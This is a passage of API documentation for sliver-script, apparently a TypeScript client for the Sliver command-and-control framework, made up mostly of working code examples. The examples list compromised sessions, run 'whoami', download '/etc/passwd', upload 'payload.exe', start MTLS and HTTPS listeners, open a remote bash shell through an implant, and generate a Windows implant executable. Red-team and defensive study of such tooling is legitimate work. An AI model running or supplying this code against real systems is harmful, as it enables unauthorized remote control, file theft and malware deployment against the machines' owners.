        console.log(`  - ${session.Name} (${session.ID})`);
        console.log(`    Remote: ${session.RemoteAddress}`);
        console.log(`    OS: ${session.OS}/${session.Arch}`);
    });
    
    // Disconnect
    await client.disconnect();
})();
```

### Example 2: Interactive Session Commands

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    // Get first session
    const sessions = await client.sessions();
    if (!sessions || sessions.length === 0) {
        console.log('No sessions available');
        return;
    }
    
    // Interact with session
    const interactive = await client.interactSession(sessions[0].ID);
    
    // Get current directory
    const pwd = await interactive.pwd();
    console.log(`Current directory: ${pwd?.Path}`);
    
    // List processes
    const processes = await interactive.ps();
    console.log(`Running processes: ${processes?.length || 0}`);
    processes?.slice(0, 10).forEach(proc => {
        console.log(`  PID ${proc.Pid}: ${proc.Executable}`);
    });
    
    // List files
    const listing = await interactive.ls();
    console.log(`Files in current directory:`);
    listing?.Files?.forEach(file => {
        console.log(`  ${file.Name} (${file.Size} bytes)`);
    });
    
    // Execute command
    const result = await interactive.execute('whoami', [], true);
    console.log(`whoami output: ${result?.Stdout}`);
    
    await client.disconnect();
})();
```

### Example 3: Download and Upload Files

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';
import * as fs from 'fs';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    const sessions = await client.sessions();
    if (!sessions || sessions.length === 0) {
        console.log('No sessions available');
        return;
    }
    
    const interactive = await client.interactSession(sessions[0].ID);
    
    // Download a file
    console.log('Downloading /etc/passwd...');
    const fileData = await interactive.download('/etc/passwd');
    fs.writeFileSync('./passwd', fileData);
    console.log(`Downloaded ${fileData.length} bytes`);
    
    // Upload a file
    console.log('Uploading payload...');
    const payload = fs.readFileSync('./payload.exe');
    await interactive.upload('/tmp/payload.exe', payload);
    console.log('Upload complete');
    
    await client.disconnect();
})();
```

### Example 4: Real-time Event Monitoring

```typescript
import { SliverClient, ParseConfigFile, Events } from 'sliver-script';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    console.log('Monitoring events...');
    
    // Monitor all events
    client.event$.subscribe({
        next: (event) => {
            const timestamp = new Date().toISOString();
            console.log(`[${timestamp}] ${event.EventType}`);
            
            switch (event.EventType) {
                case Events.SessionConnected:
                    console.log(`  New session: ${event.Session?.Name}`);
                    break;
                case Events.SessionDisconnected:
                    console.log(`  Session disconnected: ${event.Session?.Name}`);
                    break;
                case Events.JobStarted:
                    console.log(`  Job started: ${event.Job?.Name}`);
                    break;
                case Events.JobStopped:
                    console.log(`  Job stopped: ${event.Job?.Name}`);
                    break;
            }
        },
        error: (err) => {
            console.error('Event stream error:', err);
        }
    });
    
    // Keep the script running
    await new Promise(() => {});
})();
```

### Example 5: Starting Listeners

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    // Start MTLS listener
    console.log('Starting MTLS listener...');
    const mtlsListener = await client.startMTLSListener('0.0.0.0', 8888, true);
    console.log(`MTLS listener started on port ${mtlsListener?.Port}`);
    
    // Start HTTPS listener with ACME
    console.log('Starting HTTPS listener...');
    const httpsListener = await client.startHTTPSListener(
        'example.com',
        '0.0.0.0',
        443,
        true, // Use ACME/Let's Encrypt
        '', // No website
        undefined, // No custom cert
        undefined, // No custom key
        true // Persistent
    );
    console.log(`HTTPS listener started on port ${httpsListener?.Port}`);
    
    // List jobs
    const jobs = await client.jobs();
    console.log(`Active jobs: ${jobs?.length || 0}`);
    jobs?.forEach(job => {
        console.log(`  Job ${job.ID}: ${job.Name} (${job.Protocol})`);
    });
    
    await client.disconnect();
})();
```

### Example 6: Interactive Shell

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';
import * as readline from 'readline';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    const sessions = await client.sessions();
    if (!sessions || sessions.length === 0) {
        console.log('No sessions available');
        return;
    }
    
    const interactive = await client.interactSession(sessions[0].ID);
    
    // Open shell
    console.log('Opening shell...');
    const tunnel = await interactive.shell('/bin/bash', true);
    
    // Handle stdout
    tunnel.stdout.subscribe({
        next: (data) => {
            process.stdout.write(data);
        },
        complete: () => {
            console.log('\nShell closed');
            process.exit(0);
        },
        error: (err) => {
            console.error('Shell error:', err);
            process.exit(1);
        }
    });
    
    // Handle stdin from terminal
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        terminal: false
    });
    
    rl.on('line', (line) => {
        tunnel.stdin.next(Buffer.from(line + '\n'));
    });
    
    rl.on('close', () => {
        tunnel.stdin.complete();
    });
})();
```

### Example 7: Generate Implant

```typescript
import { SliverClient, ParseConfigFile } from 'sliver-script';
import { clientpb } from 'sliver-script/lib/pb/clientpb/client';
import * as fs from 'fs';

(async function() {
    const config = await ParseConfigFile('./config.cfg');
    const client = new SliverClient(config);
    await client.connect();
    
    // Create implant config
    const implantConfig = new clientpb.ImplantConfig();
    implantConfig.GOOS = 'windows';
    implantConfig.GOARCH = 'amd64';
    implantConfig.Format = clientpb.OutputFormat.EXECUTABLE;
    implantConfig.IsBeacon = false; // Session mode
    implantConfig.Name = 'my-implant';
    
    // Generate implant
    console.log('Generating implant...');
    const file = await client.generate(implantConfig);
    
    if (file?.Data) {
        const filename = `${implantConfig.Name}.exe`;
        fs.writeFileSync(filename, Buffer.from(file.Data));
        console.log(`Implant saved to ${filename}`);
    }
    
    await client.disconnect();
})();
```

---

## Notes

1. **Timeouts**: Most methods accept an optional `timeout` parameter (in seconds). The default is 30 seconds.

2. **Error Handling**: All async methods can throw errors. Always use try/catch or .catch() handlers:
   ```typescript
   try {
       const sessions = await client.sessions();
   } catch (err) {
       console.error('Error:', err);
   }
   ```

3. **Connection State**: Always call `await client.connect()` before using the client, and `await client.disconnect()` when done.

4. **Session vs Beacon**: Sessions are real-time connections; beacons check in periodically. `InteractiveSession` has the `shell()` method, but `InteractiveBeacon` does not.

5. **RxJS Observables**: The event streams use RxJS. Make sure to handle subscriptions properly and unsubscribe when needed.

6. **Buffer vs Uint8Array**: Some methods return Buffers (Node.js), while the protobuf types use Uint8Array. The library handles conversions automatically.

7. **Protobuf Types**: For advanced usage, you may need to import protobuf message types from `sliver-script/lib/pb/*`.

---

## Additional Resources

- **Sliver Project**: https://github.com/BishopFox/sliver
- **Sliver Documentation**: https://sliver.sh/docs
- **GitHub Repository**: https://github.com/moloch--/sliver-script
- **RxJS Documentation**: https://rxjs.dev/

---

## License

This library is licensed under **GPL-3.0-or-later**.

---

*This documentation was generated by analyzing the sliver-script v1.2.5 source code. For the most up-to-date information, always refer to the official repository.*
